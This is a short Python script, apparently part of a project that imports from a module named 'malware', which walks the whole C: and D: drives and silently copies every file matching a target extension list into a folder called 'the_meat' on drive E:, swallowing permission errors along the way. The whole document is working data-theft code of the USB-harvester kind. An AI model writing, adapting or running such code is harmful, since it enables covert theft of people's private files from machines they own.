import shutil
from malware import *
import os
from itertools import chain

# can change depend if it Mac ,Windows or Linux
drivers = (r'D:\\', r'C:\\')
for dirpath, dirname, filenames in chain.from_iterable(os.walk(driver) for driver in drivers):
    for file in filenames:
        if any(file.endswith(extension) for extension in ex_list):
            try:
                shutil.copy(os.path.join(dirpath, file), r'E:\the_meat')
            except PermissionError:
                pass
            except FileNotFoundError:
                pass



